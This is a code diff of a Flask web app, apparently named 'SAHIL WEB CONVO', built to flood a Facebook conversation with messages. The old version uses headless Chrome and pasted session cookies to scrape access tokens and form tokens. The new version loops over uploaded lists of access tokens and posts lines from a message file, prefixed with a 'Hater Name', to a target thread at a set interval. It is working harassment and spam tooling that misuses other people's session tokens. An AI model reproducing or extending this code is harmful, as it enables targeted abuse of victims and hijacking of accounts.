@@ -1,177 +1,105 @@
 from flask import Flask, request, render_template_string, jsonify
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
 import requests
-import time
-import re
 from threading import Thread, Event
+import time
 import random
 import string
 
 app = Flask(__name__)
 app.debug = True
 
-### Selenium based token extraction
-
-def extract_token_with_selenium(cookie_string):
-    options = Options()
-    options.add_argument('--headless')
-    options.add_argument('--disable-gpu')
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-    driver = webdriver.Chrome(options=options)
-
-    try:
-        driver.get("https://m.facebook.com")
-        time.sleep(2)
-
-        # Clear currently set cookies (if any)
-        driver.delete_all_cookies()
-
-        # Set provided cookies
-        cookies = cookie_string.split(';')
-        for c in cookies:
-            if '=' in c:
-                name, value = c.strip().split('=', 1)
-                cookie_dict = {'name': name, 'value': value, 'domain': '.facebook.com'}
-                try:
-                    driver.add_cookie(cookie_dict)
-                except Exception as e:
-                    print("Cookie set error:", e)
-
-        driver.refresh()
-        time.sleep(5)
-
-        # Try to extract access token from page source
-        page_source = driver.page_source
-        token_match = re.search(r'"accessToken":"(EAAw+)"', page_source)
-        if token_match:
-            return token_match.group(1), None
-
-        # Try from window object JS execution (some pages)
-        js_token = driver.execute_script("return window.__accessToken || null;")
-        if js_token:
-            return js_token, None
-
-        return None, "Access token not found"
-    finally:
-        driver.quit()
-
-### Cookie+fb_dtsg message sending logic
-
-headers_template = {
+headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'Referer': 'https://m.facebook.com',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'referer': 'www.google.com'
 }
+
 stop_events = {}
 threads = {}
 message_counters = {}
 
-def get_fb_dtsg(cookie):
-    session = requests.Session()
-    headers = headers_template.copy()
-    headers['Cookie'] = cookie
-    r = session.get('https://m.facebook.com', headers=headers)
-    if r.status_code != 200:
-        print("FB homepage request failed:", r.status_code)
-        return None
-    match = re.search(r'name="fb_dtsg" value="([^"]+)"', r.text)
-    if match:
-        return match.group(1)
-    else:
-        print("fb_dtsg token not found in page")
-        return None
-
-def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     message_counters[task_id] = 0
     while not stop_event.is_set():
-        for cookie in cookies_list:
+        for message1 in messages:
             if stop_event.is_set():
                 break
-            fb_dtsg = get_fb_dtsg(cookie)
-            if not fb_dtsg:
-                print("Skipping this cookie, fb_dtsg not found")
-                continue
-            headers = headers_template.copy()
-            headers['Cookie'] = cookie
-            for message1 in messages:
-                if stop_event.is_set():
-                    break
-                api_url = f'https://m.facebook.com/messages/send/?icm=1&refid=12'
-                payload = {
-                    'ids[0]': thread_id,
-                    'message': f"{mn} {message1}",
-                    'fb_dtsg': fb_dtsg,
-                    'send': 'Send',
-                }
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
                 try:
-                    response = requests.post(api_url, data=payload, headers=headers)
-                    if response.status_code == 200 and ('success' in response.text or '"error"' not in response.text):
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
                         message_counters[task_id] += 1
-                        print(f"✅ Sent ({message_counters[task_id]}): {payload['message']}")
+                        print(f"✅ Sent ({message_counters[task_id]}): {message}")
                     else:
-                        print(f"❌ Failed ({response.status_code}): {payload['message']}")
-                        print("Response Text:", response.text[:200])
+                        print(f"❌ Failed: {message}")
                 except Exception as e:
-                    print("Error sending message:", e)
+                    print("Error:", e)
                 time.sleep(time_interval)
-        time.sleep(time_interval)
 
-### Flask routes
+def extract_token_from_cookie(cookie_string, token_name='accessToken'):
+    cookies = cookie_string.split(';')
+    for c in cookies:
+        c = c.strip()
+        if c.startswith(token_name + '='):
+            return c[len(token_name) + 1:]
+    return None
 
 @app.route('/', methods=['GET', 'POST'])
-def home():
-    token = None
-    error = None
+def send_message():
     if request.method == 'POST':
-        action = request.form.get('action')
-        cookie = request.form.get('cookie')
+        token_option = request.form.get('tokenOption')
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
+        else:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
 
-        if action == 'extract_token':
-            if cookie:
-                token, error = extract_token_with_selenium(cookie.strip())
-        elif action == 'send_messages':
-            # Start message sender thread
-            cookie_option = request.form.get('tokenOption')
-            if cookie_option == 'single':
-                cookies_list = [request.form.get('singleToken')]
-            else:
-                token_file = request.files.get('tokenFile')
-                if token_file:
-                    cookies_list = token_file.read().decode().strip().splitlines()
-                else:
-                    cookies_list = []
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
 
-            thread_id = request.form.get('threadId')
-            mn = request.form.get('kidx')
-            time_interval = int(request.form.get('time'))
-            txt_file = request.files.get('txtFile')
-            messages = txt_file.read().decode().splitlines() if txt_file else []
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
 
-            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
-            stop_events[task_id] = Event()
-            thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
-            threads[task_id] = thread
-            thread.start()
-            return render_template_string(PAGE_HTML, token=None, error=None, task_id=task_id)
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
 
-    return render_template_string(PAGE_HTML, token=token, error=error, task_id=None)
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+
+        return render_template_string(PAGE_HTML, task_id=task_id)
+
+    return render_template_string(PAGE_HTML, task_id=None)
+
+@app.route('/extract_token', methods=['POST'])
+def extract_token():
+    cookie_string = request.form.get('cookie')
+    token_name = request.form.get('tokenName', 'accessToken')
+    token = extract_token_from_cookie(cookie_string, token_name)
+    if token:
+        return jsonify({'token': token})
+    else:
+        return jsonify({'error': 'Token cookie में नहीं मिला'}), 400
 
 @app.route('/status/<task_id>')
-def status(task_id):
+def get_status(task_id):
     count = message_counters.get(task_id, 0)
     running = task_id in threads and not stop_events[task_id].is_set()
     return jsonify({'count': count, 'running': running})
 
 @app.route('/stop', methods=['POST'])
-def stop():
+def stop_task():
     task_id = request.form.get('taskId')
     if task_id in stop_events:
         stop_events[task_id].set()
@@ -179,126 +107,184 @@ def stop():
     else:
         return f'No task found with ID {task_id}.'
 
-### HTML template
-
 PAGE_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Facebook Token Extractor and Message Sender</title>
-<style>
-body { background: #222; color: #eee; font-family: Arial, sans-serif; padding: 20px; }
-.container { max-width: 600px; margin: auto; background: #333; padding: 20px; border-radius: 10px; }
-label { font-weight: bold; margin-top: 10px; display: block; }
-textarea, input, select, button { width: 100%; margin-top: 5px; padding: 10px; border-radius: 5px; border:none; }
-button { background: #3b5998; color: white; font-weight: bold; cursor: pointer; }
-button:hover { background: #2d4373; }
-.status-box { margin-top: 15px; background: #111; padding: 15px; border-radius: 5px; }
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SAHIL NON-STOP SERVER</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    label { color: white; }
+    body {
+      background-image: url('https://i.ibb.co/2XxDZGX/7892676.png');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: white;
+      font-family: 'Poppins', sans-serif;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 350px;
+      height: auto;
+      border-radius: 20px;
+      padding: 20px;
+      background: rgba(0,0,0,0.5);
+      box-shadow: 0 0 15px rgba(255,255,255,0.2);
+      margin-top: 40px;
+    }
+    .form-control {
+      border: 1px solid white;
+      background: transparent;
+      color: white;
+      border-radius: 10px;
+    }
+    .form-control:focus {
+      box-shadow: 0 0 10px white;
+    }
+    .btn-submit {
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 10px;
+      background: #007bff;
+      color: white;
+      font-weight: bold;
+    }
+    .btn-submit:hover {
+      background: #0056b3;
+    }
+    .header {
+      text-align: center;
+      padding-bottom: 20px;
+      color: white;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #ccc;
+    }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .status-box {
+      margin-top: 15px;
+      background: rgba(0,0,0,0.6);
+      border-radius: 10px;
+      padding: 10px;
+      color: cyan;
+      text-align: center;
+      font-weight: bold;
+    }
+    #extractForm {
+      margin-top: 30px;
+      padding-top: 10px;
+      border-top: 1px solid white;
+    }
+  </style>
 </head>
 <body>
-<div class="container">
-<h2>Facebook Token Extractor & Message Sender</h2>
+  <header class="header mt-4">
+    <h1>SAHIL WEB CONVO</h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label>Enter Single Token</label>
+        <input type="text" class="form-control" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display:none;">
+        <label>Choose Token File</label>
+        <input type="file" class="form-control" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label>Enter Inbox/convo uid</label>
+        <input type="text" class="form-control" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label>Enter Your Hater Name</label>
+        <input type="text" class="form-control" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label>Enter Time (seconds)</label>
+        <input type="number" class="form-control" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label>Choose Your Np File</label>
+        <input type="file" class="form-control" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-submit">Run</button>
+    </form>
 
-<h3>1. Extract Access Token (Chromium based)</h3>
-<form method="post">
-<label>Paste Full Facebook Cookie:</label>
-<textarea name="cookie" rows="4" placeholder="c_user=...; xs=...;"></textarea>
-<input type="hidden" name="action" value="extract_token" />
-<button type="submit">Extract Token</button>
-</form>
+    <form id="extractForm" method="post" action="/extract_token">
+      <h5>Cookie से Token निकालें</h5>
+      <div class="mb-3">
+        <label>Cookie String डालें</label>
+        <textarea class="form-control" name="cookie" rows="3" placeholder="key1=value1; accessToken=ABC123TOKEN; key2=value2"></textarea>
+      </div>
+      <div class="mb-3">
+        <label>Token नाम (default: accessToken)</label>
+        <input type="text" class="form-control" name="tokenName" placeholder="accessToken">
+      </div>
+      <button type="submit" class="btn btn-submit">Token निकालें</button>
+    </form>
 
-{% if token %}
-<div class="status-box">
-<strong>Extracted Access Token:</strong><br/>
-<code>{{ token }}</code>
-</div>
-{% endif %}
-{% if error %}
-<div class="status-box" style="color:#ff6666;">
-<strong>Error:</strong><br/>
-{{ error }}
-</div>
-{% endif %}
+    {% if task_id %}
+    <div class="status-box" id="statusBox">
+      Task ID: <span style="color:white;">{{ task_id }}</span><br>
+      Messages Sent: <span id="msgCount">0</span>
+    </div>
+    <script>
+      const taskId = "{{ task_id }}";
+      setInterval(() => {
+        fetch(`/status/${taskId}`)
+          .then(res => res.json())
+          .then(data => {
+            if (data.running) {
+              document.getElementById('msgCount').innerText = data.count;
+            } else {
+              document.getElementById('statusBox').innerHTML = "✅ Task Completed!";
+            }
+          });
+      }, 2000);
+    </script>
+    {% endif %}
 
-<hr />
-
-<h3>2. Send Messages Using Cookies</h3>
-<form method="post" enctype="multipart/form-data">
-<label>Cookie Input Option:</label>
-<select name="tokenOption" id="tokenOption" onchange="toggleCookieInput()">
-  <option value="single">Single Cookie String</option>
-  <option value="multiple">Cookie File Upload</option>
-</select>
-
-<div id="singleCookieDiv" style="margin-top:10px;">
-<label>Paste Full Cookie:</label>
-<textarea name="singleToken" rows="3" placeholder="c_user=...; xs=...;"></textarea>
-</div>
-<div id="multipleCookieDiv" style="display:none; margin-top:10px;">
-<label>Upload Cookie File (txt):</label>
-<input type="file" name="tokenFile" />
-</div>
-
-<label>Thread ID:</label>
-<input type="text" name="threadId" required />
-
-<label>Your Name Prefix (for messages):</label>
-<input type="text" name="kidx" required />
-
-<label>Message Interval (seconds):</label>
-<input type="number" name="time" required />
-
-<label>Upload Message Text File (one message per line):</label>
-<input type="file" name="txtFile" required />
-
-<input type="hidden" name="action" value="send_messages" />
-<button type="submit">Start Sending</button>
-</form>
-
-{% if task_id %}
-<div class="status-box" id="statusBox">
-  <strong>Task ID:</strong> <span id="taskId">{{ task_id }}</span><br/>
-  <strong>Messages Sent:</strong> <span id="msgCount">0</span>
-</div>
-<script>
-let taskId = "{{ task_id }}";
-let interval = setInterval(() => {
-  fetch(`/status/${taskId}`)
-    .then(res => res.json())
-    .then(data => {
-      if (data.running) {
-        document.getElementById('msgCount').innerText = data.count;
-      } else {
-        document.getElementById('statusBox').innerHTML = '<strong>✅ Task Completed!</strong>';
-        clearInterval(interval);
-      }
-    });
-}, 2000);
-</script>
-{% endif %}
-
-<hr />
-
-<h3>3. Stop Sending Task</h3>
-<form method="post" action="/stop">
-<label>Enter Task ID to Stop:</label>
-<input type="text" name="taskId" required />
-<button type="submit" style="background:#b22222;">Stop Task</button>
-</form>
-
-</div>
-
-<script>
-function toggleCookieInput() {
-  var val = document.getElementById('tokenOption').value;
-  document.getElementById('singleCookieDiv').style.display = val === 'single' ? 'block' : 'none';
-  document.getElementById('multipleCookieDiv').style.display = val === 'multiple' ? 'block' : 'none';
-}
-window.onload = toggleCookieInput;
-</script>
+    <form method="post" action="/stop" class="mt-3">
+      <div class="mb-3">
+        <label>Enter Task ID to Stop</label>
+        <input type="text" class="form-control" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-submit" style="background:red;">Stop</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>SAHIL OFFLINE S3RV3R</p>
+    <p>SAHIL ALWAYS ON FIRE </p>
+    <div class="mb-3">
+      <a href="https://wa.me/+918115048433" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+      </a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      document.getElementById('singleTokenInput').style.display = tokenOption=='single'?'block':'none';
+      document.getElementById('tokenFileInput').style.display = tokenOption=='multiple'?'block':'none';
+    }
+  </script>
 </body>
 </html>
 '''
